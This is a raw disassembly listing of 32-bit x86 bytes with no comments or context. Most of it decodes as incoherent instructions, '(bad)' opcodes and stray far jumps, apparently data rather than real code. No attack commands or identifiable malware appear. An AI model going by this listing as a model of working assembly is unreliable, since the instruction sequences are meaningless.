  4218ca:	cmp    edi,DWORD PTR [ecx+0x15c4e45c]
  4218d0:	inc    ebp
  4218d1:	aaa    
  4218d2:	inc    edi
  4218d3:	jg     0x421892
  4218d5:	or     al,0x5d
  4218d7:	in     al,dx
  4218d8:	pop    ebp
  4218d9:	cmc    
  4218da:	add    DWORD PTR [edi],0x8e87cd00
  4218e0:	jle    0x42192b
  4218e2:	jb     0x42188b
  4218e4:	retf   
  4218e5:	rcr    DWORD PTR [eax],1
  4218e7:	push   0x51df1034
  4218ec:	popf   
  4218ed:	sub    esi,ecx
  4218ef:	xlat   BYTE PTR ds:[ebx]
  4218f0:	popf   
  4218f1:	cdq    
  4218f2:	in     al,0x45
  4218f4:	pop    edx
  4218f5:	xor    ah,0x5f
  4218f8:	(bad)  
  4218f9:	(bad)  
  4218fa:	jg     0x42188a
  4218fc:	xchg   edi,eax
  4218fd:	jmp    0x4218c2
  4218ff:	xchg   BYTE PTR [esi],dh
  421901:	jnp    0x4218e7
  421903:	lock add eax,0xee6129e5
  421909:	(bad)  
  42190a:	push   ss
  42190b:	js     0x421921
  42190d:	mov    ebx,0xc2689df3
  421912:	fst    DWORD PTR [ebx+0x26]
  421915:	in     al,0x16
  421917:	add    al,0xa8
  421919:	xchg   ebp,eax
  42191a:	scas   eax,DWORD PTR es:[edi]
  42191b:	popf   
  42191c:	add    bh,BYTE PTR [esi]
  42191e:	test   BYTE PTR [edx],dh
  421920:	retf   
  421921:	xchg   ebp,eax
  421922:	scas   al,BYTE PTR es:[edi]
  421923:	test   al,0xcd
  421925:	sbb    eax,0xfd7f2aed
  42192a:	jge    0x4218bf
  42192c:	js     0x421938
  42192e:	pushf  
  42192f:	sub    al,0x30
  421932:	cmp    edx,ecx
  421934:	mov    al,0x76
  421936:	call   DWORD PTR [ebp+esi*2+0x4d]
  42193a:	nop
  42193b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42193c:	cmp    esp,DWORD PTR [ecx+ebx*2-0x26]
  421940:	neg    DWORD PTR [edx]
  421942:	adc    eax,0x9a3c95b4
  421947:	inc    edi
  421948:	xchg   esp,eax
  421949:	adc    eax,0xa4d16611
  42194e:	ja     0x42194a
  421950:	data16 (bad) 
  421952:	pop    eax
  421953:	call   0xcb03:0x7c794caf
  42195a:	push   cs
  42195b:	daa    
  42195c:	loopne 0x42199f
  42195e:	scas   al,BYTE PTR es:[edi]
  42195f:	jp     0x4219d9
  421961:	jle    0x421997
  421963:	jnp    0x4219dc
  421965:	js     0x421927
  421967:	mov    esp,0x5ae08525
  42196c:	jns    0x421974
  42196e:	adc    al,0x8b
  421970:	xor    edx,esi
  421972:	(bad)  
  421973:	cmp    eax,ebx
  421975:	and    BYTE PTR [eax-0x37d1b8b4],cl
  42197b:	bound  ebx,QWORD PTR [esi-0x1a4c4b2d]
  421981:	lods   al,BYTE PTR ds:[esi]
  421982:	xchg   ch,bh
  421984:	xchg   esp,eax
  421985:	xchg   ebp,eax
  421986:	mov    fs,WORD PTR [ebp+0x2131a214]
  42198c:	pop    edx
  42198d:	cli    
  42198e:	xlat   BYTE PTR ds:[ebx]
  42198f:	push   esp
  421990:	mov    BYTE PTR [eax],0x0
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	lock dec ebx
  421a02:	jge    0x421a64
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0xca000001
  421a0d:	lea    ebp,[edi]
  421a0f:	(bad)  
  421a10:	pusha  
  421a11:	jmp    0x649a:0x7996720
  421a18:	lods   al,BYTE PTR ds:[esi]
  421a19:	mov    ebx,0xc0a876
  421a1e:	xor    BYTE PTR [edx+0x34e36d2b],dh
  421a24:	inc    eax
  421a25:	pop    ds
  421a26:	test   eax,0xccacdf33
  421a2b:	sti    
  421a2c:	xor    al,0x12
  421a2e:	mov    ebx,0x364ffbcf
  421a33:	xchg   edi,eax
  421a34:	and    BYTE PTR [esp+edx*8],al
  421a37:	sbb    DWORD PTR [ecx+0x4704146d],esp
  421a3d:	xor    esi,DWORD PTR [edi+0x49]
  421a40:	mov    dl,0x69
  421a42:	or     dl,BYTE PTR [ebp-0x2c91fd5d]
  421a48:	or     BYTE PTR [ecx-0x3a58d8b4],al
  421a4e:	js     0x421a2a
  421a50:	sahf   
  421a51:	retf   0x922f
  421a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a55:	stos   BYTE PTR es:[edi],al
  421a56:	xor    esi,DWORD PTR [edi]
  421a58:	mov    dl,BYTE PTR [edi+0x2b]
  421a5b:	push   ecx
  421a5c:	pop    ebx
  421a5d:	stc    
  421a5e:	adc    dh,0x79
  421a61:	aam    0x9b
  421a63:	cmp    eax,0xd7dbec9a
  421a68:	sar    DWORD PTR [esp+ecx*1-0x36],cl
  421a6c:	stos   DWORD PTR es:[edi],eax
  421a6d:	adc    DWORD PTR [eax+0x57],edx
  421a70:	mov    al,0x7e
  421a72:	jo     0x4219fd
  421a74:	out    0xa4,eax
  421a76:	and    esp,DWORD PTR [edi+0x7d114b]
  421a7c:	sub    al,0x9
  421a7e:	mov    dh,0x73
  421a80:	and    al,BYTE PTR ds:0xc0881db2
  421a86:	xor    eax,0x740d6e67
  421a8b:	call   0xdba1:0x5f407af3
  421a92:	pop    ecx
  421a93:	mov    ecx,0x6acf9f41
  421a98:	and    BYTE PTR [edx-0x65],ch
  421a9b:	in     al,dx
  421a9c:	test   esp,0x71c11c95
  421aa2:	adc    ch,BYTE PTR [ecx]
  421aa4:	je     0x421ac6
  421aa6:	push   ss
  421aa7:	xchg   edi,eax
  421aa8:	ror    DWORD PTR [edx-0x54999e78],cl
  421aae:	rol    BYTE PTR [edx-0xd9f4f59],0x1d
  421ab5:	nop
  421ab6:	xchg   ebp,eax
  421ab7:	sar    cl,0xe9
  421aba:	adc    eax,0xce245bb4
  421abf:	add    al,0x47
  421ac2:	xor    eax,0xe0191bad
  421ac7:	into   
  421ac8:	aam    0xf0
  421aca:	outs   dx,BYTE PTR ds:[esi]
  421acb:	mul    DWORD PTR [edx]
  421acd:	xor    eax,0x1031e999
  421ad2:	rcr    dh,0xd
  421ad5:	retf   0x6414
  421ad8:	sub    ebp,esi
  421ada:	lahf   
  421adb:	(bad)  
  421adc:	std    
  421add:	test   BYTE PTR [eax-0x272ef986],dh
  421ae3:	scas   al,BYTE PTR es:[edi]
  421ae4:	cmc    
  421ae5:	push   ss
  421ae6:	out    0xab,al
  421ae8:	loop   0x421a6b
  421aea:	lock mov ss:0x57881997,eax
  421af1:	sbb    ebx,edi
  421af3:	mov    ebx,0xd79c0bfd
  421af8:	outs   dx,BYTE PTR ds:[esi]
  421af9:	mov    bl,0x9e
  421afb:	adc    ebx,ecx
  421afd:	inc    ebx
  421afe:	xchg   ebx,eax
  421aff:	fs sub al,0xfb
  421b02:	or     eax,0x1ca77aba
  421b07:	mov    dh,0x90
  421b09:	dec    eax
  421b0a:	mov    ds:0x35b2b95a,eax
  421b0f:	ins    DWORD PTR es:[edi],dx
  421b10:	mov    es,WORD PTR [eax]
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dh,BYTE PTR [ebx-0x44cdc633]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x78000001
  421b8d:	dec    edi
  421b8e:	push   esp
  421b8f:	enter  0x879c,0x6e
  421b93:	in     al,0xeb
  421b95:	xchg   edi,eax
  421b96:	dec    esi
  421b97:	mov    BYTE PTR [esi-0x3e],cl
  421b9a:	sbb    DWORD PTR [ebx-0xaa1430b],esp
  421ba0:	adc    al,0x86
  421ba2:	inc    ebx
  421ba3:	push   es
  421ba4:	xchg   ebp,eax
  421ba5:	(bad)  
  421ba6:	fidivr WORD PTR [edi+0x697b4b5d]
  421bac:	dec    esp
  421bad:	push   cs
  421bae:	push   esi
  421baf:	mov    ds:0x3206d7d9,al
  421bb4:	dec    edi
  421bb5:	inc    esi
  421bb6:	or     dl,BYTE PTR [ebx+0x44621af5]
  421bbc:	sbb    esi,DWORD PTR [ecx+0x13]
  421bbf:	rcl    BYTE PTR [edx+0xe],1
  421bc2:	cld    
  421bc3:	mov    ecx,0xeb95e197
  421bc8:	aam    0xe4
  421bca:	fsub   DWORD PTR [eax]
  421bcc:	add    DWORD PTR [edi-0x64aabb82],0x6b3f7ead
  421bd6:	call   DWORD PTR [ebp+eax*4-0x51434070]
  421bdd:	ss int3 
  421bdf:	pusha  
  421be0:	pop    es
  421be1:	xchg   esi,eax
  421be2:	outs   dx,DWORD PTR ds:[esi]
  421be3:	pop    edx
  421be4:	test   eax,0x21fe303d
  421be9:	pusha  
  421bea:	ja     0x421c66
  421bec:	xchg   esp,eax
  421bed:	xchg   esp,eax
  421bee:	(bad)  
  421bef:	cmp    al,0xc7
  421bf1:	aaa    
  421bf2:	aad    0xfb
  421bf4:	push   esi
  421bf5:	sub    cl,bl
  421bf7:	paddw  mm4,QWORD PTR [ecx-0x65bb0c49]
  421bfe:	in     al,0x38
  421c00:	push   eax
  421c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c02:	inc    esi
  421c03:	xor    edx,DWORD PTR [eax+0x628ead85]
  421c09:	ror    BYTE PTR [ecx],0xaf
  421c0c:	aas    
  421c0d:	loope  0x421c15
  421c0f:	add    al,0xb1
  421c11:	js     0x421c0c
  421c13:	or     DWORD PTR [esi-0x39],eax
  421c16:	xor    esp,ebp
  421c18:	dec    edx
  421c19:	mov    edi,0xdea3eee6
  421c1e:	xchg   edi,eax
  421c1f:	push   edx
  421c20:	push   es
  421c21:	stos   DWORD PTR es:[edi],eax
  421c22:	or     al,0xe2
  421c24:	inc    ecx
  421c25:	sub    BYTE PTR [ecx+edx*2-0x4d0f70ac],0x25
  421c2d:	add    edi,edx
  421c2f:	scas   al,BYTE PTR es:[edi]
  421c30:	jg     0x421c26
  421c32:	pop    esi
  421c33:	dec    esp
  421c34:	and    edx,esp
  421c36:	arpl   ax,di
  421c38:	es xor ebx,ebx
  421c3b:	pop    ebx
  421c3c:	(bad)  
  421c3d:	retf   
  421c3e:	mov    eax,0x2fd1efdf
  421c43:	ret    
  421c44:	shl    BYTE PTR [esi],1
  421c46:	sahf   
  421c47:	shl    BYTE PTR [ecx],1
  421c49:	enter  0x414e,0x19
  421c4d:	das    
  421c4e:	add    cl,BYTE PTR [ebx+0xa]
  421c51:	popf   
  421c52:	push   ebx
  421c53:	mov    dl,0x56
  421c55:	jp     0x421c02
  421c57:	pop    ds
  421c58:	adc    DWORD PTR [ebp-0x24],esp
  421c5b:	iret   
  421c5c:	mov    esi,ds
  421c5e:	jl     0x421c11
  421c60:	jge    0x421c8d
  421c62:	cli    
  421c63:	dec    ebp
  421c64:	jae    0x421c92
  421c66:	jmp    0x421c08
  421c68:	js     0x421c23
  421c6a:	in     al,dx
  421c6b:	push   0xd0a4f085
  421c70:	out    dx,al
  421c71:	ss out 0x6a,eax
  421c74:	jmp    0x421c79
  421c76:	out    0x71,al
  421c78:	jmp    0x522ab1ef
  421c7d:	dec    ebp
  421c7e:	and    DWORD PTR [edi-0x5e8779d1],0x8038c8f6
  421c88:	add    al,BYTE PTR [edi]
  421c8a:	fimul  DWORD PTR [ebx-0x6e443759]
  421c90:	rol    BYTE PTR [eax],cl
	...
  421cf2:	add    BYTE PTR [eax],al
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	test   al,0xc7
  421d02:	mov    ds:0x168c0df,eax
  421d07:	add    BYTE PTR ds:0x4d000001,al
  421d0d:	test   al,0x4a
  421d0f:	sbb    eax,0x4a0ba65e
  421d14:	cmp    bh,bh
  421d16:	add    BYTE PTR [ebx+0x5091e6ab],0x32
  421d1d:	out    dx,eax
  421d1e:	pop    edx
  421d1f:	xor    edi,edx
  421d21:	cwde   
  421d22:	push   ecx
  421d23:	aam    0x26
  421d25:	pop    ss
  421d26:	stos   DWORD PTR es:[edi],eax
  421d27:	mov    eax,0xd9390ba
  421d2c:	adc    cl,BYTE PTR [esi]
  421d2e:	mov    ebx,0x4b9424f7
  421d33:	cmp    ecx,DWORD PTR [ebx+0x59]
  421d36:	test   BYTE PTR [eax],dh
  421d38:	inc    esi
  421d39:	rcl    dh,cl
  421d3b:	cmp    al,0x3
  421d3d:	loopne 0x421d87
  421d3f:	lahf   
  421d40:	test   BYTE PTR [ecx-0xd],ch
  421d43:	mov    dl,0x9
  421d45:	or     DWORD PTR [edx],ebx
  421d47:	and    ch,BYTE PTR [esi+esi*2-0x35]
  421d4b:	aas    
  421d4c:	mov    eax,ds:0x460aa9b8
  421d51:	jmp    0x421d39
  421d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d54:	mov    bh,0x68
  421d56:	in     al,0x9c
  421d58:	mov    edx,0x25497aff
  421d5d:	ja     0x421d40
  421d5f:	retf   0xe806
  421d62:	inc    eax
  421d63:	xchg   ebp,eax
  421d64:	push   0xffffff8c
  421d66:	mov    BYTE PTR [ebp+ebp*2-0x258284b8],ch
  421d6d:	mov    ch,0xdb
  421d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d70:	(bad)  
  421d71:	mov    ebx,0xb28418c4
  421d76:	pop    ss
  421d77:	dec    edx
  421d78:	call   0x536c:0x3eacdbdf
  421d7f:	scas   al,BYTE PTR es:[edi]
  421d80:	pop    eax
  421d81:	sub    al,BYTE PTR [eax-0x5ccbfe2c]
  421d87:	test   al,0xd1
  421d89:	xor    eax,0x2996ae39
  421d8e:	outs   dx,DWORD PTR ds:[esi]
  421d8f:	(bad)  
  421d90:	xchg   edx,eax
  421d91:	lea    esi,[eax+edx*2+0x58c4caaa]
  421d98:	pop    es
  421d99:	adc    ebx,DWORD PTR [ecx+edi*1+0x32a8c604]
  421da0:	push   ss
  421da1:	mov    bh,0xc2
  421da3:	fdivr  QWORD PTR [edx-0x774ae8c1]
  421da9:	ss or  esi,esi
  421dac:	cmp    eax,0x400a7afd
  421db1:	pusha  
  421db2:	mov    dh,BYTE PTR es:[edi]
  421db5:	fcomp  st(0)
  421db7:	jne    0x421df6
  421db9:	cmp    al,0x8e
  421dbb:	ds loope 0x421dfd
  421dbe:	fwait
  421dbf:	mov    ds:0x58dc1dea,al
  421dc4:	xchg   esp,eax
  421dc5:	lahf   
  421dc6:	mov    al,0x83
  421dc8:	sbb    al,0x7c
  421dca:	jo     0x421dad
  421dcc:	aas    
  421dcd:	cld    
  421dce:	leave  
  421dcf:	sahf   
  421dd0:	mov    WORD PTR [ebp-0x23],cs
  421dd3:	lods   al,BYTE PTR ds:[esi]
  421dd4:	add    ch,BYTE PTR [ecx+0x1e]
  421dd7:	push   esp
  421dd8:	fldcw  WORD PTR [eax]
  421dda:	adc    DWORD PTR [ebp+0x7a],0xc94a79d8
  421de1:	xor    al,0x89
  421de3:	out    dx,eax
  421de4:	out    dx,al
  421de5:	loop   0x421e16
  421de7:	mov    ch,0x9e
  421de9:	mov    bh,BYTE PTR [eax]
  421deb:	loope  0x421e4e
  421ded:	push   esi
  421dee:	xor    esp,edx
  421df0:	pop    ds
  421df1:	ins    BYTE PTR es:[edi],dx
  421df2:	mov    ecx,0xb14db789
  421df7:	mov    eax,esi
  421df9:	add    edi,DWORD PTR [edi]
  421dfb:	adc    BYTE PTR [edi],0xf0
  421dfe:	test   eax,edx
  421e00:	clc    
  421e01:	out    0x6e,eax
  421e03:	test   al,0x18
  421e05:	dec    eax
  421e06:	or     BYTE PTR [ebx],dh
  421e08:	push   esp
  421e09:	arpl   WORD PTR [edx-0x6b0dbbda],bx
  421e0f:	cmc    
  421e10:	sldt   WORD PTR [eax]
	...
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	fld    QWORD PTR [ebx]
  421e82:	xlat   BYTE PTR ds:[ebx]
  421e83:	scas   al,BYTE PTR es:[edi]
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0x1b000001,al
  421e8d:	sub    edi,DWORD PTR [ebx-0x4a]
  421e90:	mov    ebx,0xf0751eba
  421e95:	ret    
  421e96:	dec    esi
  421e97:	mov    esp,0x6b2de3f5
  421e9c:	push   esp
  421e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e9e:	rcr    DWORD PTR ds:0x15cb2304,0x23
  421ea5:	push   es
  421ea6:	clc    
  421ea7:	or     ch,0x6b
  421eaa:	scas   al,BYTE PTR es:[edi]
  421eab:	test   DWORD PTR [esi],esp
  421ead:	mov    ebx,0xd37d28c
  421eb2:	mov    bl,0x7a
  421eb4:	mov    bl,0x6
  421eb6:	mov    ebx,0xa1eba2d1
  421ebb:	add    BYTE PTR [ecx-0x591206c5],0xae
  421ec2:	ins    BYTE PTR es:[edi],dx
  421ec3:	leave  
  421ec4:	fist   DWORD PTR gs:[ebx+eax*1]
  421ec8:	jmp    0x5b492971
  421ecd:	mov    esp,0xf276e6c8
  421ed2:	sbb    edx,ecx
  421ed4:	push   edi
  421ed5:	ds mov eax,0x32cbb14d
  421edb:	lods   eax,DWORD PTR ds:[esi]
  421edc:	and    esi,DWORD PTR [edx-0x6ba33da1]
  421ee2:	pop    ecx
  421ee3:	sbb    ebp,DWORD PTR [eax]
  421ee5:	or     DWORD PTR [ecx],ecx
  421ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ee8:	fdivr  QWORD PTR [eax]
  421eea:	fcom   QWORD PTR [ebx+ebp*8]
  421eed:	imul   ebp,DWORD PTR [edi-0x16],0xedbe3199
  421ef4:	pop    ds
  421ef5:	or     esp,DWORD PTR [ebp*2+0x11347473]
  421efc:	data16 fsincos 
  421eff:	push   ds
  421f00:	test   al,0x2
  421f02:	sbb    eax,DWORD PTR [esi+0x102e75e4]
  421f08:	loope  0x421f1c
  421f0a:	dec    eax
  421f0b:	imul   DWORD PTR [edx]
  421f0d:	int    0xc0
  421f0f:	out    0xf6,al
  421f11:	test   DWORD PTR [ecx],esi
  421f13:	or     BYTE PTR [esi+0x3fc27fd7],bl
  421f19:	psraw  mm4,QWORD PTR [ecx-0x5ee93331]
  421f20:	nop
  421f21:	ret    
  421f22:	xor    eax,0xe74f8e88
  421f27:	or     eax,0x8a7996e4
  421f2c:	test   BYTE PTR [eax+0x47],bl
  421f2f:	retf   
  421f30:	cmp    al,0x1
  421f32:	(bad)  
  421f33:	in     eax,dx
  421f34:	std    
  421f35:	call   0x9783:0x332e90bf
  421f3c:	enter  0x874e,0x56
  421f40:	jns    0x421f00
  421f42:	outs   dx,DWORD PTR ds:[esi]
  421f43:	nop
  421f44:	push   edx
  421f45:	in     eax,dx
  421f46:	enter  0xc647,0x14
  421f4a:	out    0xcd,eax
  421f4c:	loope  0x421fa5
  421f4e:	enter  0xefb7,0xd4
  421f52:	loope  0x421eef
  421f54:	add    esp,DWORD PTR ss:[eax+0x42]
  421f58:	lahf   
  421f59:	int    0xae
  421f5b:	arpl   WORD PTR [ebx+0x70cce459],ax
  421f61:	outs   dx,BYTE PTR ds:[esi]
  421f62:	dec    ebp
  421f63:	and    esp,DWORD PTR [esi+0x3f7d6348]
  421f69:	sar    DWORD PTR [edx+0x7a87b08d],0xe5
  421f70:	inc    ecx
  421f71:	adc    esi,DWORD PTR [edx+0x3b37243f]
  421f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f78:	mov    bh,0x8a
  421f7a:	or     edi,0xffffffa0
  421f7d:	ret    0x956d
  421f80:	fisttp DWORD PTR [esi-0x38]
  421f83:	sahf   
  421f84:	inc    edi
  421f85:	jmp    0x30cf:0x7cbc6215
  421f8c:	adc    al,0xd3
  421f8e:	cld    
  421f8f:	add    al,0xb3
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 adc ah,0xe3
  422003:	adc    edx,ecx
  422005:	push   0x1
  422007:	add    BYTE PTR ds:0xff000001,al
  42200d:	not    BYTE PTR [edx]
  42200f:	(bad)  [eax]
  422011:	push   ebx
  422012:	inc    esi
  422013:	dec    edi
  422014:	sub    cl,BYTE PTR [edi+0x3dbb3abd]
  42201a:	add    BYTE PTR [edx],0x1c
  42201d:	lea    eax,[ecx-0x3a3559ac]
  422023:	push   eax
  422024:	and    DWORD PTR [edx+eiz*1],edi
  422027:	jne    0x422049
  422029:	leave  
  42202a:	mov    ch,cl
  42202c:	cmp    dl,BYTE PTR ds:0x86e690a7
  422032:	dec    edx
  422033:	xchg   ecx,eax
  422034:	or     BYTE PTR [eax+0x106461f2],bl
  42203a:	xlat   BYTE PTR ds:[ebx]
  42203b:	(bad)  
  42203d:	call   0x3f8d:0xf1b4027f
  422044:	int3   
  422045:	fld    QWORD PTR [eax-0x7b24ea2f]
  42204b:	xor    eax,0x4add05de
  422050:	mov    ah,0xa7
  422052:	sub    edi,ebp
  422054:	cmp    eax,0xff4f04f2
  422059:	mov    edi,ebx
  42205b:	in     eax,dx
  42205c:	std    
  42205d:	pusha  
  42205e:	fwait
  42205f:	push   es
  422060:	cli    
  422061:	xor    al,0x95
  422063:	and    bl,BYTE PTR gs:[esp+edi*4+0x6f]
  422068:	jns    0x4220d0
  42206a:	(bad)  [eax]
  42206c:	cmp    dl,BYTE PTR [ebp-0x63]
  42206f:	adc    al,dl
  422071:	das    
  422072:	dec    esp
  422073:	sbb    edx,DWORD PTR [ebx+edx*4]
  422076:	push   ecx
  422077:	sti    
  422078:	retf   
  422079:	mov    edx,0x825371c8
  42207e:	or     DWORD PTR [esi],0xffffffe5
  422081:	mov    edi,0x1875f74f
  422086:	mov    al,ds:0x88127628
  42208b:	repnz mov ebx,0x561b57ae
  422091:	mov    ecx,0xf85cd48f
  422096:	sub    eax,0xb44d43a6
  42209b:	inc    edi
  42209c:	jle    0x4220ac
  42209e:	mov    esi,0x11939c77
  4220a3:	mov    ebp,0xa4a156cb
  4220a8:	rcl    DWORD PTR [esi],1
  4220aa:	dec    edi
  4220ab:	xchg   ebx,eax
  4220ac:	scas   al,BYTE PTR es:[edi]
  4220ad:	xchg   ebp,eax
  4220ae:	stos   DWORD PTR es:[edi],eax
  4220af:	add    ch,dl
  4220b1:	jb     0x42212c
  4220b3:	retf   
  4220b4:	cmc    
  4220b5:	ss inc ebx
  4220b7:	pop    ebp
  4220b8:	xchg   DWORD PTR [ebx+0x2638fb07],esp
  4220be:	pop    edi
  4220bf:	xor    DWORD PTR [ecx+ecx*2+0x3dd65856],ecx
  4220c6:	xchg   edx,eax
  4220c7:	xchg   ebp,eax
  4220c8:	(bad)  
  4220c9:	lock mov bh,0xea
  4220cc:	sbb    BYTE PTR [eiz*8-0x6d876e8b],ch
  4220d3:	test   ch,bl
  4220d5:	pusha  
  4220d6:	jge    0x422068
  4220d8:	out    0x80,al
  4220da:	mov    dh,0xf3
  4220dc:	aam    0x50
  4220de:	inc    ecx
  4220df:	jmp    0x422102
  4220e1:	stos   BYTE PTR es:[edi],al
  4220e2:	pop    esp
  4220e3:	and    al,0x32
  4220e5:	loop   0x4220b1
  4220e7:	mov    DWORD PTR [ecx+0x4],edx
  4220ea:	xor    eax,ebp
  4220ec:	inc    bp
  4220ee:	fisub  WORD PTR [esi+0x28]
  4220f1:	(bad)  
  4220f2:	fwait
  4220f3:	les    eax,FWORD PTR [edx-0x68]
  4220f6:	and    bl,BYTE PTR fs:[ebp-0x7dc3f9cd]
  4220fd:	xchg   edi,eax
  4220fe:	mov    ebx,0xaacdd0e8
  422103:	push   es
  422104:	push   ebx
  422105:	call   0x25c9:0x659107df
  42210c:	lahf   
  42210d:	repz jecxz 0x42214e
  422110:	pop    edx
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    edx,DWORD PTR [eax]
  422181:	call   0x6c118e94
  422186:	add    DWORD PTR [eax],eax
  422188:	add    eax,0xc5000001
  42218d:	fistp  QWORD PTR [ebp-0x30]
  422190:	out    0xf6,al
  422192:	in     eax,dx
  422193:	loop   0x4221b1
  422195:	sbb    ebp,eax
  422197:	pop    esi
  422198:	add    ah,BYTE PTR [edi]
  42219a:	inc    ebp
  42219b:	xcrypt-ofb (bad)
  42219c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219d:	sub    dl,BYTE PTR [eax+ebx*8-0x29]
  4221a1:	loop   0x4221bd
  4221a3:	fdiv   QWORD PTR [ebx-0x15]
  4221a6:	sub    DWORD PTR [ecx+0x35],ebp
  4221a9:	out    0x76,eax
  4221ab:	into   
  4221ac:	cdq    
  4221ad:	scas   eax,DWORD PTR es:[edi]
  4221ae:	adc    DWORD PTR [eax+0x1f],ecx
  4221b1:	(bad)  [ecx]
  4221b3:	std    
  4221b4:	pop    ebp
  4221b5:	sar    DWORD PTR [esi+0x1],0xba
  4221b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ba:	and    eax,DWORD PTR [edx+0x69f4c186]
  4221c0:	mov    eax,0x11faf989
  4221c5:	jmp    0x71d0a1f5
  4221ca:	jp     0x4221fb
  4221cc:	fcom   QWORD PTR [eax-0x72]
  4221cf:	setb   BYTE PTR [edx]
  4221d2:	sub    BYTE PTR [edx-0x3c],ah
  4221d5:	cmp    ebp,DWORD PTR [edx]
  4221d7:	scas   al,BYTE PTR es:[edi]
  4221d8:	pop    eax
  4221d9:	mov    bl,0x8b
  4221db:	cld    
  4221dc:	rol    BYTE PTR [esi+esi*8+0x61],1
  4221e0:	sar    dl,1
  4221e2:	int    0xff
  4221e4:	(bad)  [eax-0x43]
  4221e7:	mov    al,ds:0x8a85a7da
  4221ec:	mov    esp,0xdded1f63
  4221f1:	jle    0x422222
  4221f3:	adc    dh,BYTE PTR [esi+edx*2-0x38]
  4221f7:	shr    DWORD PTR [edi],0x98
  4221fa:	xchg   BYTE PTR [edi+0x3b8d6a75],ah
  422200:	hlt    
  422201:	aas    
  422202:	loope  0x4221de
  422204:	xchg   esp,eax
  422205:	aas    
  422206:	lods   al,BYTE PTR ds:[esi]
  422207:	pop    ds
  422208:	inc    ebx
  422209:	jbe    0x42228a
  42220b:	dec    esp
  42220c:	cld    
  42220d:	or     ah,0xf3
  422210:	pop    edx
  422211:	mov    ebx,0xd34b96bd
  422216:	jb     0x4221c1
  422218:	pop    esp
  422219:	push   cs
  42221a:	or     DWORD PTR [ebx+0x1e616e95],ebp
  422220:	adc    BYTE PTR [edi],cl
  422222:	cmp    eax,0xf6bfbdd8
  422227:	pop    ecx
  422228:	inc    ebp
  422229:	fwait
  42222a:	in     al,dx
  42222b:	mov    ah,bl
  42222d:	cli    
  42222e:	push   eax
  42222f:	mov    eax,ds:0xeb4f62b2
  422234:	dec    edi
  422235:	or     ebp,edi
  422237:	clc    
  422238:	mov    edx,0xca952b3c
  42223d:	or     BYTE PTR [edi+edi*2+0x7975ce04],cl
  422244:	pop    ecx
  422245:	data16 shr BYTE PTR [edi+0x61ab62d6],1
  42224c:	nop
  42224d:	jo     0x422281
  42224f:	sbb    ecx,DWORD PTR [edx]
  422251:	sbb    al,0x12
  422253:	xchg   ebx,eax
  422254:	stos   DWORD PTR es:[edi],eax
  422255:	sbb    cl,BYTE PTR [esi+0x57b6b84e]
  42225b:	push   es
  42225c:	sub    ebp,edi
  42225e:	mov    BYTE PTR [ebp-0x639c0880],dl
  422264:	sub    DWORD PTR [edi+0x354ad25f],0xffffff84
  42226b:	imul   ebp,DWORD PTR [eax+ecx*2],0x65
  42226f:	mov    dl,0xbe
  422271:	nop
  422272:	jno    0x4222b6
  422274:	add    DWORD PTR [esi+0xa],ebp
  422277:	stos   BYTE PTR es:[edi],al
  422278:	repnz aam 0xfd
  42227b:	inc    ebx
  42227c:	in     eax,0x76
  42227e:	stos   BYTE PTR es:[edi],al
  42227f:	dec    eax
  422280:	sub    al,0x2
  422282:	repz fsub QWORD PTR [esi]
  422285:	ficom  DWORD PTR ss:[edx-0x6bd01970]
  42228c:	and    BYTE PTR [esp+esi*8-0x2d],bh
  422290:	push   ss
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	(bad)  
  422302:	daa    
  422303:	pop    es
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x8c000001
  42230d:	stc    
  42230e:	push   DWORD PTR [esi-0x62]
  422311:	pop    ecx
  422312:	mov    DWORD PTR [ecx-0x29],0x68ec61fd
  422319:	retf   
  42231a:	addr16 je 0x422399
  42231d:	(bad)  
  42231e:	fbld   TBYTE PTR [edi+0x418c5f27]
